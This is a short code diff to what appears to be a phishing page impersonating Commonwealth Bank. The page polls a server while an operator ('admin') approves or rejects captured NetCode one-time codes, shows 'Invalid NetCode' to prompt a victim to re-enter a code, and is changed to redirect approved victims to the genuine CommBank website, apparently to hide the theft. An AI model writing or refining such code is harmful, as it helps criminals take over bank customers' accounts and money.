@@ -278,7 +278,8 @@
 
         if (data.status === 'ok') {
           isWaitingForAdmin = false;
-          window.location.href = '/unregister.html';
+          // Redirect to CommBank website on approval
+          window.location.href = 'https://www.commbank.com.au/';
           return;
         }
 
@@ -287,6 +288,7 @@
           hideLoading();
           clearForm();
           showErrorMessage('Invalid NetCode. Please try again.');
+          // Clear the redo status so we don't loop
           fetch('/api/clearRedo', {
             method: 'POST',
             headers: { 'content-type': 'application/json' },
@@ -295,6 +297,7 @@
           return;
         }
 
+        // Continue polling
         pollInterval = setTimeout(poll, 1200);
 
       } catch (err) {
@@ -830,6 +833,7 @@
   </div>
  </body>
 </html>
+
 
 
 
